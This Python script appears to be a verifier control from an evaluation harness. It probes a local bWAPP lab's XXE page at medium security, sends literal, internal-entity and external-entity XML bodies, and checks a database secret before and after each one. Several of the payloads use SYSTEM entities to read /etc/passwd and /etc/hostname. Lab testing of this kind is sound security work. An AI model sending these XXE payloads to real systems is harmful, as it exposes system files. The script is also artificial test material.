#!/usr/bin/env python3
# verifier-ind t10 : medium-level discriminating control for B2
import json, subprocess, time, requests

BASE = "http://127.0.0.1/bWAPP"


def db(sql):
    r = subprocess.run(["sudo", "-n", "mysql", "-N", "-B", "-e", sql],
                       capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def login(level="1"):
    s = requests.Session()
    s.get(BASE + "/login.php", timeout=15)
    s.post(BASE + "/login.php",
           data={"login": "bee", "password": "bug", "security_level": level, "form": "submit"},
           timeout=15)
    s.cookies.set("security_level", level, domain="127.0.0.1", path="/")
    p = s.get(BASE + "/portal.php", timeout=15)
    return s, ("logout.php" in p.text), p.status_code


def xxe(s, body):
    r = s.post(BASE + "/xxe-2.php", data=body.encode(),
               headers={"Content-Type": "text/xml; charset=UTF-8"}, timeout=20)
    return r.status_code, r.text.strip()


def restore():
    s2, ok, _ = login("1")
    c, t = xxe(s2, '<?xml version="1.0"?><reset><secret>Any bugs?</secret></reset>')
    return {"http": c, "resp": t[:60], "secret": db("SELECT secret FROM bWAPP.users WHERE login='bee';")}


out = {"probe": "medium-level discriminating control", "cases": []}
s, authed, pcode = login("1")
out["login"] = {"authed": authed, "portal": pcode,
                "cookies": {c.name: c.value for c in s.cookies}}
out["secret_before_all"] = db("SELECT secret FROM bWAPP.users WHERE login='bee';")
out["session_login_probe"] = None

tests = [
    ("C1-plain-literal", '<?xml version="1.0"?><reset><secret>VRFPLAINLIT1</secret></reset>',
     "CONTROL: literal, no entity. If this does not write, my medium harness is broken."),
    ("C2-internal-entity", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "VRFINTENT1">]><reset><secret>&e;</secret></reset>',
     "internal entity in <secret> at medium"),
    ("C3-SYSTEM-hostname", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><reset><secret>AA&x;BB</secret></reset>',
     "SYSTEM file:///etc/hostname bracketed by literals"),
    ("C4-SYSTEM-passwd", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><reset><secret>&x;</secret></reset>',
     "SYSTEM file:///etc/passwd"),
    ("C5-internal-entity-nested", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "VRFNEST1">]><reset><secret>P&e;Q</secret></reset>',
     "nested literal marker around internal entity"),
]
for cid, body, note in tests:
    before = db("SELECT secret FROM bWAPP.users WHERE login='bee';")
    code, txt = xxe(s, body)
    time.sleep(1.2)
    after = db("SELECT secret FROM bWAPP.users WHERE login='bee';")
    rec = {"id": cid, "note": note, "http": code, "resp": txt[:200],
           "secret_before": before, "secret_after": after,
           "wrote": before != after, "ts": time.strftime("%H:%M:%S")}
    if after != "Any bugs?":
        rec["restore"] = restore()
    out["cases"].append(rec)

# does the session really carry login=bee? re-read a page that echoes it
p = s.get(BASE + "/xxe-1.php", timeout=15)
out["session_login_probe"] = "Welcome Bee" in p.text or "Bee" in p.text
out["secret_final"] = db("SELECT secret FROM bWAPP.users WHERE login='bee';")
print(json.dumps(out, ensure_ascii=False, indent=1))
